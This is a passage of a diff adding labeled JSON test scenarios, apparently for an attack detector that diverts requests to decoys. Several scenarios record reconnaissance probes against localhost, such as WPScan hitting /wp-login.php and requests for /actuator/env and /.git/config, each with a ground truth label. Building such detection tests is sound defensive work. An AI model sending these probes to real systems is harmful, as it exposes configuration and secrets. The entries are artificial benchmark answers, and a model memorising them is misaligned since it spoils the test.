+          "user-agent": "curl/7.81.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.147"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-048",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_048",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/wp-login.php",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)"
+        },
+        "body": "",
+        "client_ip": "10.0.50.148"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-049",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_049",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/actuator/env",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "masscan/1.3.2"
+        },
+        "body": "",
+        "client_ip": "10.0.50.149"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-050",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_050",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/.git/config",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "curl/7.68.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.150"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    }
+  ]
+}
